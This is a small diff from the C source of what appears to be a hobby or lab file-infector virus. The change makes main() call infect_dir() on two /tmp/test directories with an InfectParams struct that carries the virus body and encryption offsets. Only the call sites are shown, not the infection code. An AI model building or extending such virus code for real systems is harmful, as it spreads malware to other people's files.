@@ -110,7 +110,7 @@ int main(int ac, char **av){
 		//else if (str_equal(av[i], "--big-recur"))
 		//	opt.print_msg = TRUE;
 	}
-	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
-	infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
+	infect_dir("/tmp/test", (InfectParams){virus, virus_len, 0,0, crypt_off, crypt_len}, opt);
+	infect_dir("/tmp/test2", (InfectParams){virus, virus_len, 0,0, crypt_off, crypt_len}, opt);
 	return 0;
 }
